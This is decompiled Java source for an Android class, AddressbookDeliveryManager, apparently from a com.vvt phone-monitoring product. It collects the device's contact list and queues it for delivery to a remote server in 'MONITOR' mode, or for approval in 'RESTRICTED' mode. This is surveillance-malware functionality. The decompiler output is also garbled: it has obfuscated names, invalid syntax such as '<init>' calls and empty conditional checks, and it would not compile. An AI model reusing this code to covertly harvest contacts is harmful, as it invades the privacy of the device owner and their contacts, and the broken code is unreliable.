package com.vvt.addressbookmanager.delivery;

import android.content.Context;

import com.vvt.base.FxAddressbookMode;
import com.vvt.base.RunningMode;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.h;
import com.vvt.phoenix.prot.command.e;
import com.vvt.phoenix.prot.command.g;
import com.vvt.phoenix.prot.command.s;
import com.vvt.phoenix.prot.command.t;
import java.util.List;

public class AddressbookDeliveryManager {
    enum DeliverRequestType {
        GET_ADDRESSBOOK,
        SEND_ADDRESSBOOK,
        SEND_ADDRESSBOOK_FOR_APPROVAL
    }

    private static final boolean a = d.a;
    private int b = 102;
    private com.vvt.datadeliverymanager.b c;
    private com.vvt.addressbookmanager.c.a d;
    private com.vvt.datadeliverymanager.a.a e;
    private Context context;
    private RunningMode runningMode;

    public AddressbookDeliveryManager(int paramInt, Context context, RunningMode runningMode) {
        this.b = paramInt;
        this.context = context;
        this.runningMode = runningMode;
    }

    private h a(com.vvt.phoenix.prot.command.b paramb) {
        boolean bool = true;
        h localh = new com.vvt.datadeliverymanager.h();
        int i = this.b;
        localh.a(i);
        localh.a(paramb);
        localh.a(DeliveryRequestType.REQUEST_TYPE_NEW);
        localh.a(PriorityRequest.PRIORITY_NORMAL);
        localh.a(DataProviderType.DATA_PROVIDER_TYPE_NONE);
        localh.c(5);
        localh.b(60000L);
        localh.c(bool);
        localh.b(bool);
        return localh;
    }

    private void a(AddressbookDeliveryManager.DeliverRequestType paramDeliverRequestType, FxAddressbookMode paramFxAddressbookMode) {
        boolean bool = a;
        if (bool) {}
        if (paramDeliverRequestType == AddressbookDeliveryManager.DeliverRequestType.GET_ADDRESSBOOK) {
            localObject1 = new com.vvt.phoenix.prot.command.g();
        }

        for (;;) {
            localObject1 = a((com.vvt.phoenix.prot.command.b)localObject1);
            Object localObject2 = this.e;
            ((h)localObject1).a((com.vvt.datadeliverymanager.a.a)localObject2);
            localObject2 = this.c;
            ((com.vvt.datadeliverymanager.b)localObject2).a((h)localObject1);
            bool = a;
            if (bool) {}
            return;
            localObject1 = b(paramDeliverRequestType, paramFxAddressbookMode);
        }
    }

    private com.vvt.phoenix.prot.command.b b(AddressbookDeliveryManager.DeliverRequestType paramDeliverRequestType, FxAddressbookMode paramFxAddressbookMode)
    {
        boolean bool1 = a;
        if (bool1) {}
        com.vvt.phoenix.prot.event.b localb = new com.vvt.phoenix.prot.event.b();
        long l = 1L;
        localb.a(l);
        localb.a("AndroidBook");
        Object localObject1 = this.d;
        List localList = ((com.vvt.addressbookmanager.c.a)localObject1).c();
        bool1 = a;
        if (bool1) {}
        localObject1 = this.runningMode;
        Object localObject2 = RunningMode.FULL;
        boolean bool3;
        boolean bool2;
        if (localObject1 == localObject2) {
            bool3 = true;
            int i = localList.size();
            localb.a(i);
            localObject2 = this.d;
            localObject1 = new com.vvt.addressbookmanager.delivery.a(localList, (com.vvt.addressbookmanager.c.a)localObject2, paramFxAddressbookMode, localContext, bool3);
            localb.a(this.context);
            if (paramDeliverRequestType != AddressbookDeliveryManager.DeliverRequestType.SEND_ADDRESSBOOK_FOR_APPROVAL) {
                break label174;
            }
            bool2 = a;
            if (bool2) {}
            localObject1 = new com.vvt.phoenix.prot.command.s();
            localObject1.a(localb);
        }

        for (;;) {
            return (com.vvt.phoenix.prot.command.b)localObject1;
            bool3 = false;
            break;
            label174:
            bool2 = a;
            if (bool2) {}
            localObject1 = new com/vvt/phoenix/prot/command/t;
            ((t)localObject1).<init>();
            ((t)localObject1).b(localb);
        }
    }

    public void a()
    {
        boolean bool = a;
        if (bool) {}
        AddressbookDeliveryManager.DeliverRequestType localDeliverRequestType = AddressbookDeliveryManager.DeliverRequestType.SEND_ADDRESSBOOK;
        FxAddressbookMode localFxAddressbookMode = FxAddressbookMode.MONITOR;
        a(localDeliverRequestType, localFxAddressbookMode);
        bool = a;
        if (bool) {}
    }

    public void a(com.vvt.addressbookmanager.c.a parama)
    {
        this.d = parama;
    }

    public void a(com.vvt.datadeliverymanager.a.a parama)
    {
        this.e = parama;
    }

    public void a(com.vvt.datadeliverymanager.b paramb)
    {
        this.c = paramb;
    }

    public void b()
    {
        boolean bool = a;
        if (bool) {}
        AddressbookDeliveryManager.DeliverRequestType localDeliverRequestType = AddressbookDeliveryManager.DeliverRequestType.SEND_ADDRESSBOOK_FOR_APPROVAL;
        FxAddressbookMode localFxAddressbookMode = FxAddressbookMode.RESTRICTED;
        a(localDeliverRequestType, localFxAddressbookMode);
        bool = a;
        if (bool) {}
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/addressbookmanager/delivery/AddressbookDeliveryManager.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */